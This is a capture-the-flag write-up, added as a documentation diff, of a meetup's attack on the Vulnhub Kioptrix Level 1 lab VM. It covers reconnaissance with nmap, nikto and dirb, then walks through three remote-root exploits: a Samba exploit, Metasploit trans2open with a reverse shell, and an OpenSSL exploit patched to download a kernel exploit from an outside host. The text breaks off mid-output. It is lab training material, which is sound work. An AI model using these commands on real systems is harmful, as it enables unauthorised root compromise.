@@ -1,0 +1,639 @@
+.. include:: /pentest_links.txt
+
+.. _Kioptrix1:
+
+****************
+Kioptrix Level 1
+****************
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `Vulnhub Kioptrix: Level 1 (#1) <https://www.vulnhub.com/entry/kioptrix-level-1-1,22/>`_, the first of the `Vulnhub Kioptrix Series <https://www.vulnhub.com/series/kioptrix,8/>`_.
+
+  This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
+
+Setting up the VMware VM
+------------------------
+
+The VM comes packaged as `Kioptrix_Level_1.rar <http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar>`_, which is a rar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of :file:`/etc/shadow`, and delete the root password hash. This will provide passwordless access to Kioptrix1 via root.
+
+See :ref:`VMSetup` for background on using the VMware vmdk file. Kioptrix1 runs Red Hat Linux 7.2 (Enigma) with i686 kernel 2.4.7-10. Here's how you can create a backing store to undo any changes to the disk:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  VM=kioptrix1
+  curl --remote-name http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar
+  $SUDO apt-get install unrar -y
+  $SUDO unrar e Kioptrix_Level_1.rar
+  BACKING="Kioptix Level 1.vmdk"
+  VM_DISK=$VM-changes.qcow2
+  $SUDO qemu-img create -f qcow2 -o backing_file="$BACKING"  $VM_DISK
+  $SUDO qemu-img info $BACKING
+  $SUDO qemu-img info $VM_DISK
+  # To revert to original image
+  # BACKING="Kioptix Level 1.vmdk"
+  # VM_DISK=$VM-changes.qcow2
+  # $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+
+Then Linux KVM could use the VM_DISK to create the kioptrix1 VM. The actual command the author used in Debian Linux to create the VM was:
+
+.. code-block:: bash
+
+  VM=kioptrix1
+  $SUDO virt-install \
+      --network="bridge=br0,model=ne2k_pci" \
+      --name "$VM" --cpu host --vcpus 1 --ram 512 \
+      --os-type=linux --os-variant=generic24 \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+  # Useful commands:
+  # $SUDO virsh help
+  # $SUDO virsh list --all
+  # $SUDO virsh destroy --graceful $VM
+  # $SUDO virsh start $VM
+  # $SUDO virsh reboot $VM
+  # $SUDO virsh shutdown $VM
+  # $SUDO virsh undefine [--wipe-storage] $VM
+  # $SUDO virsh undefine $VM
+  # $SUDO virsh help destroy
+  # 
+
+During the boot you'll have to utilize kudzu hardware configuration: "Remove Configuration" for the PCnet LANCE and "Configure" the added RTL-8029(AS) NIC by migrating the existing network configuration. You can "Ignore" the rest of the added devices. 
+
+If kioptrix were running and you wanted to "start over again":
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  VM=kioptrix1
+  $SUDO virsh shutdown $VM
+  BACKING="Kioptix Level 1.vmdk"
+  VM_DISK=$VM-changes.qcow2
+  $SUDO qemu-img create -f qcow2 -o backing_file="$BACKING"  $VM_DISK
+  $SUDO virsh start $VM
+  # Rerun kudzu to configure the hardware
+
+
+Reconnaisance
+=============
+
+Directory setup
+---------------
+
+We'll refer to the following directories below:
+
+.. code-block:: bash
+
+  BASE=$HOME/pentest
+  PT=$BASE/kioptrix1
+  TOOLS=exploit,nmap,spider
+  eval mkdir -p $PT/{$TOOLS}
+
+Reconnaisance
+-------------
+
+Network reconnaissance
+^^^^^^^^^^^^^^^^^^^^^^
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  cd $PT/nmap
+  NMOUT=nmap
+  SN='192.168.1.0/24'
+  TARGETS=targets.txt
+  $SUDO nmap -sn -PE -oA ${NMOUT}_sn $SN
+  $SUDO chown $USER.$USER ${NMOUT}_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up ${NMOUT}_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc ${NMOUT}_sn.xml -o ${NMOUT}_sn.html
+
+Running this gives us:
+
+.. code-block:: console
+  :emphasize-lines: 9-11
+
+  hacker@kali:~/pentest/kioptrix1$ SUDO=$(which sudo)
+  hacker@kali:~/pentest/kioptrix1$ [[ "$USER" == "root" ]] && SUDO=
+  hacker@kali:~/pentest/kioptrix1$ cd $PT/nmap
+  hacker@kali:~/pentest/kioptrix1/nmap$ NMOUT=nmap
+  hacker@kali:~/pentest/kioptrix1/nmap$ SN='192.168.1.0/24'
+  hacker@kali:~/pentest/kioptrix1/nmap$ TARGETS=targets.txt
+  hacker@kali:~/pentest/kioptrix1/nmap$ $SUDO nmap -sn -PE -oA ${NMOUT}_sn $SN
+  ###################### SNIP ######################
+  Nmap scan report for 192.168.1.102
+  Host is up (-0.086s latency).
+  MAC Address: 52:54:00:14:FD:26 (QEMU Virtual NIC)
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/kioptrix1/nmap$ $SUDO chown $USER.$USER ${NMOUT}_sn.*
+  hacker@kali:~/pentest/kioptrix1/nmap$ # use the grep-able output to get a list of target hosts
+  hacker@kali:~/pentest/kioptrix1/nmap$ grep Up ${NMOUT}_sn.gnmap | cut -d" " -f2 > $TARGETS
+  hacker@kali:~/pentest/kioptrix1/nmap$ # use the xml output to get an html report
+  hacker@kali:~/pentest/kioptrix1/nmap$ xsltproc ${NMOUT}_sn.xml -o ${NMOUT}_sn.html
+
+At this point we have $TARGETS so scan them:
+
+.. code-block:: bash
+
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -iL $TARGETS -oA ${NMOUT}_A
+  $SUDO chown $USER.$USER ${NMOUT}_A.*
+  xsltproc ${NMOUT}_A.xml -o ${NMOUT}_A.html
+
+Running this gives us:
+
+.. code-block:: console
+  :emphasize-lines: 1,3-8,10-11,13,15-24,26,28-33,35-42
+
+  hacker@kali:~/pentest/kioptrix1/nmap$ $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -iL $TARGETS -oA ${NMOUT}_A
+  ###################### SNIP ######################
+  Discovered open port 22/tcp on 192.168.1.102
+  Discovered open port 443/tcp on 192.168.1.102
+  Discovered open port 139/tcp on 192.168.1.102
+  Discovered open port 111/tcp on 192.168.1.102
+  Discovered open port 80/tcp on 192.168.1.102
+  Discovered open port 32768/tcp on 192.168.1.102
+  ###################### SNIP ######################
+  PORT      STATE SERVICE     VERSION
+  22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+  ###################### SNIP ######################
+  80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+  ###################### SNIP ######################
+  |_http-title: Test Page for the Apache Web Server on Red Hat Linux
+  111/tcp   open  rpcbind     2 (RPC #100000)
+  | rpcinfo: 
+  |   program version   port/proto  service
+  |   100000  2            111/tcp  rpcbind
+  |   100000  2            111/udp  rpcbind
+  |   100024  1          32768/tcp  status
+  |_  100024  1          32768/udp  status
+  139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+  443/tcp   open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+  ###################### SNIP ######################
+  |_http-title: Test Page for the Apache Web Server on Red Hat Linux
+  ###################### SNIP ######################
+  32768/tcp open  status      1 (RPC #100024)
+  MAC Address: 52:54:00:14:FD:26 (QEMU Virtual NIC)
+  Device type: general purpose
+  Running: Linux 2.4.X
+  OS CPE: cpe:/o:linux:linux_kernel:2.4
+  OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
+  ###################### SNIP ######################
+  Host script results:
+  | nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+  | Names:
+  |   KIOPTRIX<00>         Flags: <unique><active>
+  |   KIOPTRIX<03>         Flags: <unique><active>
+  |   KIOPTRIX<20>         Flags: <unique><active>
+  |   MYGROUP<00>          Flags: <group><active>
+  |   MYGROUP<1e>          Flags: <group><active>
+  ###################### SNIP ######################
+  hacker@kali:~/pentest/kioptrix1/nmap$ $SUDO chown $USER.$USER ${NMOUT}_A.*
+  hacker@kali:~/pentest/kioptrix1/nmap$ xsltproc ${NMOUT}_A.xml -o ${NMOUT}_A.html
+
+Exposed services
+^^^^^^^^^^^^^^^^
+
+Our target kioptrix1 is T=192.168.1.102 and runs:
+
+port 22: OpenSSH 2.9p2 (protocol 1.99)
+""""""""""""""""""""""""""""""""""""""
+
+Look for actual exploits in `Search Exploit Database <https://www.exploit-db.com/search/>`_ with `advanced search specifying openssh, linux platform, remote exploits <https://www.exploit-db.com/search/?action=search&text=openssh&e_author=&platform=16&type=3>`_. There were 6 hits of which only `Dropbear SSH <= 0.34 - Remote Root Exploit <https://www.exploit-db.com/exploits/387/>`_ looked promising but requires a hacked ssh client. That may be a bit too much work if something easier is available. Running ``searchsploit openssh`` generated simliar results to the Exploit Database search.
+
+`CVE Details Openbsd Openssh 2.9p2 Security Vulnerabilities <http://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-6040/Openbsd-Openssh-2.9p2.html>`_ lists these possible serious exploits: `CVE-2006-5051 <http://www.cvedetails.com/cve/CVE-2006-5051/>`_ (if GSSAPI authentication is enabled), `CVE-2002-0640 <http://www.cvedetails.com/cve/CVE-2002-0640/>`_ (if using PAM modules with interactive keyboard  authentication (PAMAuthenticationViaKbdInt)), `CVE-2002-0639 <http://www.cvedetails.com/cve/CVE-2002-0639/>`_ (when OpenSSH is using SKEY or BSD_AUTH authentication), and `CVE-2002-0083 <http://www.cvedetails.com/cve/CVE-2002-0083/>`_ (local users or remote malicious servers can gain privileges). Of these, `CVS-2002-0083 <http://www.cvedetails.com/cve/CVE-2002-0083/>`_ looks most promising, but requires valid credentials. A proof-of-concept is available via `/data/vulnerbilites/exploit/osschan.tgz <http://www.securityfocus.com/data/vulnerabilities/exploits/osshchan.tgz>`_.
+
+No easy exploits surfaced.
+
+ports 80, 443: Apache httpd 1.3.20 on RedHat Linux 7.2
+""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+kioptrix1 runs Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b), easily onfirmed this with a simple ``socat`` run:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix1/exploit$ T=192.168.1.102
+  hacker@kali:~/pentest/kioptrix1/exploit$ echo "HEAD / HTTP1.1" | socat - tcp:$T:80
+  ###################### SNIP ######################
+  Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+  ###################### SNIP ######################
+
+Apache 1.3.20 points to the very old RedHat Linux 7.2 which released with the 2.4.7 Linux kernel. `Red Hat Linux 7.2 General Advisories <https://rhn.redhat.com/errata/rh72-errata.html>`_ shows the announced RedHat Linux 7.2 vulnerabilities.
+
+Look for actual exploits in `Search Exploit Database <https://www.exploit-db.com/search/>`_ using openssl, mod_ssl, and apache. Using the advanced search to restrict exploits to "remote" exploits on the "linux" platform reduces the number of hits: mod_ssl gets 0, "apache httpd" only gets 2 unrelated hits, while `openssl search <https://www.exploit-db.com/search/?action=search&text=openssl&e_author=&platform=16&type=3>`_ returns 11 of which only `Apache OpenSSL - Remote Exploit <https://www.exploit-db.com/exploits/764/>`_ looks promising; later we'll see it allows remotely getting root.
+
+Just looking at CVE's generates too many that may not have published exploits: `CVE Details Apache Https Server 1.3.20 <http://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-5146/Apache-Http-Server-1.3.20.html>`_ identifies 37 possible Apache exploits; `CVE Details Mod Ssl 2.8.4 <http://www.cvedetails.com/vulnerability-list/vendor_id-1046/product_id-1817/version_id-6036/>`_ shows 2; and `CVE Details Openssl 0.9.6b <http://www.cvedetails.com/vulnerability-list/vendor_id-217/product_id-383/version_id-7312/Openssl-Openssl-0.9.6b.html>`_ shows 37 exploits.
+
+ports 111, 32768: rpcbind, statd 
+""""""""""""""""""""""""""""""""
+
+Run ``rpcinfo -p $T`` to scan port 111:
+
+.. code-block:: console
+  :emphasize-lines: 2,4-
+
+  hacker@kali:~$ T=192.168.1.102
+  hacker@kali:~$ rpcinfo -p $T
+     program vers proto   port
+      100000    2   tcp    111  portmapper
+      100000    2   udp    111  portmapper
+      100024    1   udp  32768  status
+      100024    1   tcp  32768  status
+
+port 139: netbios-ssn Samba smbd (workgroup: MYGROUP)
+"""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+Run ``smbclient`` to determine the Samba 2.2.1a version:
+
+.. code-block:: console
+  :emphasize-lines: 1,3
+
+  hacker@kali:~/pentest/kioptrix1/exploit$ smbclient -L $T -N
+  Anonymous login successful
+  Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    IPC$            IPC       IPC Service (Samba Server)
+    ADMIN$          IPC       IPC Service (Samba Server)
+  Anonymous login successful
+  Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+
+    Server               Comment
+    ---------            -------
+    KIOPTRIX             Samba Server
+
+    Workgroup            Master
+    ---------            -------
+    MYGROUP              KIOPTRIX
+
+`Exploit Database search of samba for remote linux <https://www.exploit-db.com/search/?action=search&text=samba&e_author=&platform=16&type=3>`_ got 21 hits of which 2 remote root exploits looked promising: `Samba <= 2.2.8 - Remote Root Exploit <https://www.exploit-db.com/exploits/10/>`_ and `Samba trans2open Overflow (Linux x86) <https://www.exploit-db.com/exploits/16861/>`_ (for Metasploit). Two to ignore are `Samba 2.2.8 - (Bruteforce Method) Remote Root Exploit <https://www.exploit-db.com/exploits/55/>`_ (code was an erector set including 2 mains along with missing include's) and `Samba 2.2.x - Remote Root Buffer Overflow Exploit <https://www.exploit-db.com/exploits/7/>`_ (simply didn't work).
+
+Alternatively we could have run ``searchsploit samba`` to get these same exploits:
+
+.. code-block:: console
+  :emphasize-lines: 1,5
+
+  hacker@kali:~/pentest/kioptrix1/exploit$ searchsploit samba
+  --------------------------------------------- ---------------------------------- Description                                 |  Path
+  --------------------------------------------- ----------------------------------
+  Samba 2.2.x - Remote Root Buffer Overflow Ex | /linux/remote/7.pl
+  Samba <= 2.2.8 - Remote Root Exploit         | /linux/remote/10.c
+  Samba 2.2.8 (Bruteforce Method) Remote Root  | /linux/remote/55.c
+  ###################### SNIP ######################
+  --------------------------------------------- ----------------------------------
+
+`CVE Details Samba Samba 2.2.1.a Security Vulnerabilities <http://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-9501/Samba-Samba-2.2.1a.html>`_ lists possible exploits.
+
+Reconnaisance on ports 80 & 443
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+dirb
+""""
+
+First scan the web server with :program:`dirb`:
+
+.. code-block:: bash
+
+  T=192.168.1.102
+  cd $PT/spider
+  dirb  http://$T/ -o dirb.txt
+
+The results of the scan were:
+
+.. code-block:: console
+  :emphasize-lines: 1,3-10
+
+  hacker@kali:~/pentest/kioptrix1/spider$ cat dirb.txt
+  ###################### SNIP ######################
+  ---- Scanning URL: http://192.168.1.102/ ----
+  + http://192.168.1.102/cgi-bin/ (CODE:403|SIZE:272)
+  + http://192.168.1.102/index.html (CODE:200|SIZE:2890)
+  ==> DIRECTORY: http://192.168.1.102/manual/
+  ==> DIRECTORY: http://192.168.1.102/mrtg/
+  ==> DIRECTORY: http://192.168.1.102/usage/
+  + http://192.168.1.102/~operator (CODE:403|SIZE:273)
+  + http://192.168.1.102/~root (CODE:403|SIZE:269)
+  ###################### SNIP ######################
+
+nikto
+"""""
+
+Next up was a :program:`nikto` scan:
+
+.. code-block:: bash
+
+  T=192.168.1.102
+  cd $PT/spider
+  nikto -output nikto.txt -host $T -port 80,443
+
+The results of the scan were:
+
+.. code-block:: console
+  :emphasize-lines: 1,15
+
+  hacker@kali:~/pentest/kioptrix1/spider$ cat nikto.txt
+  - Nikto v2.1.6/2.1.5
+  + Target Host: 192.168.1.102
+  + Target Port: 80
+  + GET Server leaks inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 20:12:46 2001
+  + GET The anti-clickjacking X-Frame-Options header is not present.
+  + OSVDB-637: GET Enumeration of users is possible by requesting ~username (responds with 'Forbidden' for users, 'not found' for non-existent users).
+  + OSVDB-27487: GET Apache is vulnerable to XSS via the Expect header
+  + HEAD Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+  + HEAD mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+  + HEAD OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.
+  + OSVDB-838: GET Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+  + OSVDB-4552: GET Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+  + OSVDB-2733: GET Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+  + GET mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
+  + OPTIONS Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+  + OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
+  + GET ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+  + OSVDB-682: GET /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). CA-2000-02.
+  + OSVDB-3268: GET /manual/: Directory indexing found.
+  + OSVDB-3092: GET /manual/: Web server manual found.
+  + OSVDB-3268: GET /icons/: Directory indexing found.
+  + OSVDB-3233: GET /icons/README: Apache default file found.
+  + OSVDB-3092: GET /test.php: This might be interesting...
+  + Target Host: 192.168.1.102
+  + Target Port: 443
+  + GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+  + GET Hostname '192.168.1.102' does not match certificate's CN 'localhost.localdomain/emailAddress=root@localhost.localdomain'
+  + OSVDB-637: GET Enumeration of users is possible by requesting ~username (responds with 'Forbidden' for users, 'not found' for non-existent users).
+  + OSVDB-27487: GET Apache is vulnerable to XSS via the Expect header
+  + HEAD Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+  + HEAD mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+  + HEAD OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.
+  + OSVDB-838: GET Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+  + OSVDB-4552: GET Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+  + OSVDB-2733: GET Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+  + GET mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
+  + OPTIONS Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+  + OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
+  + GET ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+  + OSVDB-682: GET /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). CA-2000-02.
+  + OSVDB-3092: GET /manual/: Web server manual found.
+  + OSVDB-3268: GET /icons/: Directory indexing found.
+  + OSVDB-3233: GET /icons/README: Apache default file found.
+  + OSVDB-3092: GET /test.php: This might be interesting...
+
+The most promising result unfortunately had no ready exploit available online: mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell (CVE-2002-0082, OSVDB-756).
+
+
+The Exploits
+============
+
+Some challenges exploit misconfiguration, but this one appears to rely on old, vulnerable software. Reconnaissance identified an number of possible exploits and we illustrate a few of them here.
+
+Samba <= 2.2.8 - Remote Root Exploit
+------------------------------------
+
+The best exploit option appears to be `Samba <= 2.2.8 - Remote Root Exploit <https://www.exploit-db.com/exploits/10/>`_. Here's the exploit:
+
+.. code-block:: bash
+
+  cd $PT/exploit
+  # Kali source at /usr/share/exploitdb/platforms/linux/remote/10.c has format issues:
+  #   (1) CRLF line endings which can be fixed by running "dos2unix 10.c"
+  #   (2) Single lines split in two, giving the compiler fits. Hand-edit to fix those.
+  # OR instead pull it down from exploit-db (much easier):
+  curl --silent --output 10.c https://www.exploit-db.com/download/10
+  dos2unix 10.c
+  gcc 10.c -o exploit10
+  ./exploit10 -v -b 0 $T
+
+Running this gives us our root exploit:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix1$ cd $PT/exploit
+  hacker@kali:~/pentest/kioptrix1/exploit$ # Kali source at /usr/share/exploitdb/platforms/linux/remote/10.c has format issues:
+  hacker@kali:~/pentest/kioptrix1/exploit$ #   (1) CRLF line endings which can be fixed by running "dos2unix 10.c"
+  hacker@kali:~/pentest/kioptrix1/exploit$ #   (2) Single lines split in two, giving the compiler fits. Hand-edit to fix those.
+  hacker@kali:~/pentest/kioptrix1/exploit$ # OR instead pull it down from exploit-db (much easier):
+  hacker@kali:~/pentest/kioptrix1/exploit$ curl --silent --output 10.c https://www.exploit-db.com/download/10
+  hacker@kali:~/pentest/kioptrix1/exploit$ dos2unix 10.c
+  dos2unix: converting file 10.c to Unix format ...
+  hacker@kali:~/pentest/kioptrix1/exploit$ gcc 10.c -o exploit10
+  hacker@kali:~/pentest/kioptrix1/exploit$ ./exploit10 -v -b 0 $T
+  samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+  --------------------------------------------------------------
+  + Verbose mode.
+  + Bruteforce mode. (Linux)
+  + Host is running samba.
+  + Using ret: [0xbffffed4]
+  + Using ret: [0xbffffda8]
+  + Using ret: [0xbffffc7c]
+  + Using ret: [0xbffffb50]
+  + Worked!
+  --------------------------------------------------------------
+  *** JE MOET JE MUIL HOUWE
+  Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+  uid=0(root) gid=0(root) groups=99(nobody)
+  bash -i
+  bash: no job control in this shell
+  [root@kioptrix tmp]# id
+  id
+  uid=0(root) gid=0(root) groups=99(nobody)
+  [root@kioptrix tmp]# uname -a
+  uname -a
+  Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+  [root@kioptrix tmp]# hostname
+  hostname
+  kioptrix.level1
+  [root@kioptrix tmp]# exit
+  exit
+  exit
+  exit
+  exit
+  exit
+  Connection lost.
+
+  hacker@kali:~/pentest/kioptrix1/exploit$ 
+
+And so we have root.
+
+Samba trans2open Overflow (Linux x86)
+-------------------------------------
+
+This option uses the Megasploit Framework. See `Kali Linux Official Documentation - Metasploit Framework <http://docs.kali.org/general-use/starting-metasploit-framework-in-kali>`_ for starting the necessary services. Here's the exploit:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  $SUDO service postgresql start
+  $SUDO service metasploit start
+  $SUDO msfconsole
+
+Then in the msfconsole:
+
+.. code-block:: bash
+
+  db_status
+  vulns --info --search trans2open
+  use exploit/linux/samba/trans2open
+  set RHOST 192.168.1.102
+  exploit
+
+Running the above shows you get root:
+
+.. code-block:: console
+
+  hacker@kali:~$ $SUDO msfconsole
+  ###################### SNIP ######################
+  msf > db_status
+  [*] postgresql connected to msf3
+  msf > vulns --info --search trans2open
+  [*] Time: 2015-06-28 18:46:39 UTC Vuln: host=192.168.1.102 name=Samba trans2open Overflow (Linux x86) refs=URL-http://seclists.org/bugtraq/2003/Apr/103,URL-http://seclists.org/bugtraq/2003/Apr/103,BID-7294,BID-7294,OSVDB-4469,OSVDB-4469,CVE-2003-0201 info=Exploited by exploit/linux/samba/trans2open to create Session 1
+  msf > use exploit/linux/samba/trans2open
+  msf exploit(trans2open) > set RHOST 192.168.1.102
+  RHOST => 192.168.1.102
+  msf exploit(trans2open) > exploit
+
+  [*] Started reverse handler on 192.168.1.104:4444 
+  [*] Trying return address 0xbffffdfc...
+  [*] Trying return address 0xbffffcfc...
+  [*] Trying return address 0xbffffbfc...
+  [*] Trying return address 0xbffffafc...
+  [*] Command shell session 1 opened (192.168.1.104:4444 -> 192.168.1.102:32770) at 2015-06-28 11:49:46 -0700
+
+  bash -i
+  bash: no job control in this shell
+  [root@kioptrix tmp]# id
+  id
+  uid=0(root) gid=0(root) groups=99(nobody)
+  [root@kioptrix tmp]# uname -a
+  uname -a
+  Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+  [root@kioptrix tmp]# hostname
+  hostname
+  kioptrix.level1
+  [root@kioptrix tmp]# exit
+  exit
+  exit
+  exit
+
+  [*] 192.168.1.102 - Command shell session 1 closed.  Reason: Died from EOFError
+
+  msf exploit(trans2open) > exit
+
+And so we have root. Cleanup with:
+
+.. code-block:: bash
+
+  $SUDO service metasploit stop
+  $SUDO service postgresql stop
+
+Apache OpenSSL - Remote Exploit
+-------------------------------
+
+`Apache OpenSSL - Remote Exploit <https://www.exploit-db.com/exploits/764/>`_ gets root but requires :program:`gcc` on kioptrix1. It can be exploited as follows (following `Pentest lab - Kioptrix Level 1 <http://chousensha.github.io/blog/2014/06/12/pentest-lab-kioptrix-level-1/>`_). It's relatively difficult to get working due to a couple of problems in the source code 764.c:
+
+* Missing includes: "#include <openssl/rc4.h>", "#include <openssl/md5.h>"
+
+* The "wget ..." URL needs to be updated to "wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c"
+
+* get_server_hello declaration "unsigned char \*p, \*end;" changed to "const ...".
+
+The code is set to work for a fixed number of offsets so you run ``./exploit764`` to view the possible offsets to try, then ``./exploit764 OFFSET $T 443`` to run try a particular offset. Here we have the choice of 0x6a (doesn't work) and 0x6b (does work).
+
+.. code-block:: bash
+
+  T=192.168.1.102
+  PT=$HOME/pentest/kioptrix1
+  cd $PT/exploit
+  curl --silent --output 764.c https://www.exploit-db.com/download/764
+  dos2unix 764.c
+  # mods to 764.c
+  #   add missing includes
+  sed -i '/^#include <openssl\/evp.h>$/a\
+  #include <openssl/rc4.h>\
+  #include <openssl/md5.h>' 764.c
+  sed -i 's|http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c|https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c|' 764.c
+  sed -i 's/\(unsigned char \*p, \*end;\)/const \1/' 764.c
+  gcc 764.c -o exploit764 -lcrypto
+  # check for redhat offsets in apache 1.3.20
+  ./exploit764 | grep -i redhat | grep 1.3.20
+  # 0x6a fails, 0x6b works
+  ./exploit764 0x6b $T 443
+
+Running this gives us our root exploit:
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/kioptrix1/exploit$ T=192.168.1.102
+  hacker@kali:~/pentest/kioptrix1/exploit$ PT=$HOME/pentest/kioptrix1
+  hacker@kali:~/pentest/kioptrix1/exploit$ cd $PT/exploit
+  hacker@kali:~/pentest/kioptrix1/exploit$ curl --silent --output 764.c https://www.exploit-db.com/download/764
+  hacker@kali:~/pentest/kioptrix1/exploit$ dos2unix 764.c
+  dos2unix: converting file 764.c to Unix format ...
+  hacker@kali:~/pentest/kioptrix1/exploit$ # mods to 764.c
+  hacker@kali:~/pentest/kioptrix1/exploit$ #   add missing includes
+  hacker@kali:~/pentest/kioptrix1/exploit$ sed -i '/^#include <openssl\/evp.h>$/a\> #include <openssl/rc4.h>\
+  > #include <openssl/md5.h>' 764.c
+  hacker@kali:~/pentest/kioptrix1/exploit$ sed -i 's|http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c|https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c|' 764.c
+  hacker@kali:~/pentest/kioptrix1/exploit$ sed -i 's/\(unsigned char \*p, \*end;\)/const \1/' 764.c
+  hacker@kali:~/pentest/kioptrix1/exploit$ gcc 764.c -o exploit764 -lcrypto
+  hacker@kali:~/pentest/kioptrix1/exploit$ # check for redhat offsets in apache 1.3.20
+  hacker@kali:~/pentest/kioptrix1/exploit$ ./exploit764 | grep -i redhat | grep 1.3.20
+	  0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+	  0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+  hacker@kali:~/pentest/kioptrix1/exploit$ # 0x6a fails, 0x6b works
+  hacker@kali:~/pentest/kioptrix1/exploit$ ./exploit764 0x6b $T 443
+
+  *******************************************************************
+  * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+  *******************************************************************
+  * by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+  * #hackarena  irc.brasnet.org                                     *
+  * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+  * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+  * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
